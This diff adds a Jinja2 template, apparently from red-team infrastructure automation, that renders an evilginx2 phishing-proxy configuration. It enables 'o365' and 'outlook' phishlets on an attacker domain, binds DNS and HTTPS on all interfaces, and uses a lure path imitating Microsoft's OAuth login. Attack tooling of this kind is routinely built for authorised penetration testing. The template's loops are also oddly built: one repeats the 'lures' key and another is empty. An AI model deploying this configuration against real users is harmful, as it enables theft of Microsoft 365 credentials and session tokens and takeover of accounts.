@@ -1,0 +1,54 @@
+{% for vm in warhorse.vm|selectattr("evilginx2", "defined" ) %}
+{% if vm.evilginx2.enabled %}
+{
+  "bind_ipv4": "0.0.0.0",
+  "blacklist": {
+    "mode": "unauth"
+  },
+  "general": {
+    "bind_ipv4": "",
+    "dns_port": 53,
+    "domain": {{vm.evilginx2.evilginx_domain }},
+    "external_ipv4": "0.0.0.0",
+    "https_port": 443,
+    "ipv4": "",
+    "unauth_url": ""
+  },
+{% for lures in vm.evilginx2.lures %}
+ "lures": [
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/common/oauth2/v2.0",
+      "paused": 0,
+      "phishlet": "o365",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    }
+  ],
+{% endfor %}
+"phishlets": {
+    "o365": {
+      "hostname": {{ vm.evilginx2.evilginx_domain }},
+      "unauth_url": {{ vm.evilginx2.redirect_domain }},
+      "enabled": true,
+      "visible": true
+    },
+    "outlook": {
+      "hostname": {{ vm.evilginx2.evilginx_domain }},
+      "unauth_url": {{ vm.evilginx2.redirect_domain }},
+      "enabled": true,
+      "visible": true
+    }
+  }
+}
+{% for phishlets in vm.evilginx2.phishlets %}
+{% endfor %}
+{% endif %}
+{% endfor %}
